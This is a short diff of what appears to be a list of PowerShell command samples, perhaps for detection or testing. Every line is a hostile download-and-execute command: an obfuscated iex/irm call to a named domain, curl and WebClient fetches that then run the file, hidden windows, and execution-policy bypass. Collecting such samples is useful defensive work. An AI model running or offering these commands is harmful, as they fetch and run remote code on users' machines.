@@ -19,4 +19,3 @@ iex(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})
 powershell \"switch($true){default{&($($lc='';foreach($u in 105,101,120){$lc=$lc+[char]$u};$lc)) $(&('ir'+'m') 'apqiwg.com/z9xX')}}\"
 powershell -ExecutionPolicy Bypass \"curl.exe -s -o $env:temp\\39310.ps1 523997074/39310;& $env:temp\\39310.ps1\"
 powershell -WindowStyle Hidden -Command \"$p=Join-Path $env:PUBLIC '56a61926.exe';(New-Object Net.WebClient).DownloadFile('<URL>',$p);Start-Process $p\"
-powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('<URL>'))\"
